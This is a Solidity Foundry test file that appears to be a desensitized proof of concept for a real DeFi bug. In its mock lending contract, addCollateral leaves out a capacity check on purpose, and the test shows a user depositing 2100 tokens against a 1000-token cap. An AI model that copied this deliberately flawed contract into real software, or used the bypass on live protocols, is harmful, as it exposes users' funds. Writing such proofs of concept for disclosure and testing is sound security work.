// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title CollateralCapacityBypass Test
 * @notice Demonstrates collateral capacity limit bypass vulnerability
 * @dev This is a simplified, desensitized version of a real vulnerability
 */
contract CollateralCapacityBypassTest is Test {
    MockGearingToken gearingToken;
    MockERC20 collateralToken;
    MockERC20 debtToken;
    
    address admin = address(0x1);
    address user = address(0x2);
    
    uint256 constant COLLATERAL_CAPACITY = 1000e18; // 1000 tokens max
    
    function setUp() public {
        vm.startPrank(admin);
        
        // Deploy tokens
        collateralToken = new MockERC20("Collateral", "COL", 18);
        debtToken = new MockERC20("Debt", "DEBT", 18);
        
        // Deploy gearing token with capacity limit
        gearingToken = new MockGearingToken(
            address(collateralToken),
            COLLATERAL_CAPACITY
        );
        
        vm.stopPrank();
        
        // Mint collateral to user
        collateralToken.mint(user, 10000e18);
    }
    
    function testCollateralCapacityBypass() public {
        vm.startPrank(user);
        
        collateralToken.approve(address(gearingToken), type(uint256).max);
        
        // 1. Create initial loan within capacity (100 tokens)
        uint256 initialCollateral = 100e18;
        uint256 loanId = gearingToken.createLoan(initialCollateral);
        
        assertEq(gearingToken.getLoanCollateral(loanId), initialCollateral);
        assertEq(collateralToken.balanceOf(address(gearingToken)), initialCollateral);
        
        console.log("=== Initial State ===");
        console.log("Loan Collateral:", initialCollateral / 1e18);
        console.log("Capacity Limit:", COLLATERAL_CAPACITY / 1e18);
        
        // 2. Bypass capacity by adding collateral (2000 tokens)
        // Total will be 2100, exceeding the 1000 capacity
        uint256 addAmount = 2000e18;
        
        console.log("\n=== Attempting to Add Collateral ===");
        console.log("Adding:", addAmount / 1e18);
        console.log("Expected Total:", (initialCollateral + addAmount) / 1e18);
        
        // This SHOULD fail but passes due to missing check in addCollateral
        gearingToken.addCollateral(loanId, addAmount);
        
        // 3. Verify capacity was bypassed
        uint256 newCollateral = gearingToken.getLoanCollateral(loanId);
        
        console.log("\n=== After Adding Collateral ===");
        console.log("New Loan Collateral:", newCollateral / 1e18);
        console.log("Total in Contract:", collateralToken.balanceOf(address(gearingToken)) / 1e18);
        
        // Vulnerability confirmed: collateral exceeds capacity
        assertGt(newCollateral, COLLATERAL_CAPACITY, "VULNERABILITY: Capacity bypassed!");
        assertEq(newCollateral, initialCollateral + addAmount);
        assertEq(collateralToken.balanceOf(address(gearingToken)), initialCollateral + addAmount);
        
        vm.stopPrank();
    }
    
    function testCreateLoanEnforcesCapacity() public {
        vm.startPrank(user);
        
        collateralToken.approve(address(gearingToken), type(uint256).max);
        
        // Creating new loan with amount exceeding capacity should fail
        uint256 excessiveAmount = 1500e18;
        
        vm.expectRevert("Collateral capacity exceeded");
        gearingToken.createLoan(excessiveAmount);
        
        vm.stopPrank();
    }
}

/**
 * @title MockGearingToken
 * @notice Simplified gearing token with capacity limit vulnerability
 */
contract MockGearingToken {
    IERC20 public collateralToken;
    uint256 public collateralCapacity;
    
    uint256 private nextLoanId = 1;
    mapping(uint256 => uint256) public loanCollateral;
    
    constructor(address _collateralToken, uint256 _capacity) {
        collateralToken = IERC20(_collateralToken);
        collateralCapacity = _capacity;
    }
    
    function createLoan(uint256 amount) external returns (uint256) {
        // CORRECT: Checks capacity before creating loan
        require(
            collateralToken.balanceOf(address(this)) + amount <= collateralCapacity,
            "Collateral capacity exceeded"
        );
        
        collateralToken.transferFrom(msg.sender, address(this), amount);
        
        uint256 loanId = nextLoanId++;
        loanCollateral[loanId] = amount;
        
        return loanId;
    }
    
    function addCollateral(uint256 loanId, uint256 amount) external {
        require(loanCollateral[loanId] > 0, "Loan does not exist");
        
        // VULNERABILITY: Missing capacity check!
        // Should check: balanceOf(this) + amount <= collateralCapacity
        
        collateralToken.transferFrom(msg.sender, address(this), amount);
        loanCollateral[loanId] += amount;
    }
    
    function getLoanCollateral(uint256 loanId) external view returns (uint256) {
        return loanCollateral[loanId];
    }
}

/**
 * @title MockERC20
 * @notice Simple ERC20 for testing
 */
contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            allowance[from][msg.sender] -= amount;
        }
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transferFrom(address, address, uint256) external returns (bool);
}
